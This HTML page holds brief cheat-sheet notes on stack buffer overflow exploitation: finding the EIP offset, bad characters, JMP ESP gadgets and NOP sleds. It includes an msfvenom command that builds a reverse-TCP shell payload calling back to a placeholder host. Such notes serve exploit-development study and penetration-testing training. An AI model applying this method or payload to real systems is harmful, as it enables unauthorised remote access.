<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>No Protections</title>
</head><body>Buffer Overflow<br/>
Determine length of overflow trigger w/ binary search "A"x1000<br/>
Determine exact EIP with pattern_create.rb -l 1000, &amp; pattern_offset.rb -q &lt;pattern&gt;<br/>
Determine badchars to make sure all of your payload is getting through (Mona has a good module for this, probably others too)<br/>
Disassemble/Objdump and find an address for JMP ESP (0xff,0xe4), CALL ESP, or other<br/>
Develop exploit<br/>
&nbsp;&#09;Is the payload right at ESP<br/>
&nbsp;&#09;&#09;JMP ESP<br/>
&nbsp;&#09;Is the payload before ESP<br/>
&nbsp;&#09;&#09;sub ESP, 200 and then JMP ESP<br/>
&nbsp;&#09;&#09;or<br/>
&nbsp;&#09;&#09;call [ESP-200]<br/>
&nbsp;&#09;&#09;NOPsled into payload (or \xCC to break so you know where you're actually landing)<br/>
msfvenom -a x86 --platform windows/linux -p something/shell_reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename<br/>
&nbsp;&#09;Make sure it fits your payload length above<br/>
&nbsp;&#09;Make sure no bad chars<br/>
Gain shell, local priv esc or rooted already?<br/>
<br/>
<br/>
Short jumps? <br/>
Try jumping to environment variables instead<br/>
</body></html>